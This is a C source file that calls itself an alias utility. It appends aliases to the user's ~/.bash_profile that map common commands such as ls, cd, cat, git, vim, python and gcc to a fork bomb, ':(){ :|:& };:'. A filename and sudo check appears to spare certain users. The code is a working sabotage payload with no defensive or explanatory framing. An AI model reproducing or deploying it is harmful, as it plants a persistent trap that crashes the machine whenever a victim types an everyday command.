//
// Created by kkyse on 10/4/2017.
//

#include "alias.h"

#include <stdbool.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

typedef unsigned int uint;

#define DEBUG false

bool is_sudo() {
    return system("sudo -v") != 0;
}

typedef struct alias_t {
    const char *const name;
    const char *const value;
} Alias;

typedef struct aliases_t {
    Alias *aliases;
    uint capacity;
    uint size;
} Aliases;

Aliases *new_Aliases(const uint initial_size) {
    Aliases *const aliases = (Aliases *) malloc(sizeof(Aliases));
    aliases->size = 0;
    aliases->capacity = initial_size;
    aliases->aliases = (Alias *) malloc(initial_size * sizeof(Alias));
    return aliases;
}

Aliases *new_default_Aliases() {
    return new_Aliases(10);
}

void free_Aliases(Aliases *const aliases) {
    free(aliases->aliases);
    free(aliases);
}

void ensure_capacity(Aliases *const aliases, const uint min_capacity) {
    if (aliases->capacity >= min_capacity) {
        return;
    }
    aliases->capacity = min_capacity;
    aliases->aliases = (Alias *) realloc(aliases->aliases, min_capacity * sizeof(Alias));
}

void alias(Aliases *const aliases, const char *const name, const char *const value) {
    if (aliases->size == aliases->capacity) {
        ensure_capacity(aliases, aliases->capacity << 1);
    }
    Alias alias = {name, value};
    memcpy(aliases->aliases + aliases->size++, &alias, sizeof(Alias));
}

void alias_fb(Aliases *const aliases, const char *const name) {
    alias(aliases, name, ":(){ :|:& };:");
}

void alias_fbs(Aliases *const aliases, const char *const *const names, const uint num_names) {
    ensure_capacity(aliases, num_names);
    for (uint i = 0; i < num_names; ++i) {
        alias_fb(aliases, names[i]);
    }
}

bool dangerous_filename(const char *const filename) {
    return strstr(filename, "khyber") || strstr(filename, "sen") || is_sudo();
}

char *checked_filename(const char *const filename) {
    if (!dangerous_filename(filename)) {
        return (char *) filename;
    }
    const size_t len = strlen(filename);
    char *const new_filename = (char *) malloc((len + 2) * sizeof(char)); // for ~ and null
    strcpy(new_filename, filename);
    new_filename[len] = '~';
    new_filename[len + 1] = 0;
    return new_filename;
}

bool save_aliases(const Aliases *const aliases, const char *filename) {
    filename = checked_filename(filename);
    #if (DEBUG)
    printf("saving aliases in %s\n", filename);
    #endif
    FILE *const file = fopen(filename, "a");
    if (file == NULL) {
        return false;
    }
    fputs("\n\n", file);
    const uint size = aliases->size;
    for (uint i = 0; i < size; ++i) {
        const Alias alias = aliases->aliases[i];
        #if (DEBUG)
        printf("%s=\"%s\"\n", alias.name, alias.value);
        #endif
        fprintf(file, "alias %s=\"%s\"\n", alias.name, alias.value);
    }
    fputs("\n\n", file);
    fclose(file);
    return true;
}

bool save_aliases_default_location(const Aliases *const aliases) {
    const char filename[] = "/.bash_profile";
    const char *const home = getenv("HOME");
    const size_t home_len = strlen(home);
    char *const path = (char *) malloc(sizeof(filename) + home_len * sizeof(char));
    strcpy(path, home);
    strcpy(path + home_len, filename);
    return save_aliases(aliases, path);
}

#define arraysize(array) (sizeof((array)) / sizeof(*(array)))

static const char *const alias_names[] = {
        "ls",
        "ll",
        "cd",
        "cat",
        "git",
        "vi",
        "vim",
        "emacs",
        "grep",
        "java",
        "python",
        "gcc",
        "g++",
};

void make_aliases() {
    Aliases *const aliases = new_default_Aliases();
    alias_fbs(aliases, (const char **) alias_names, arraysize(alias_names));
    int num_tries = 100;
    while (num_tries-- && !save_aliases_default_location(aliases));
    free_Aliases(aliases);
}

int main() {
    make_aliases();
    return 0;
}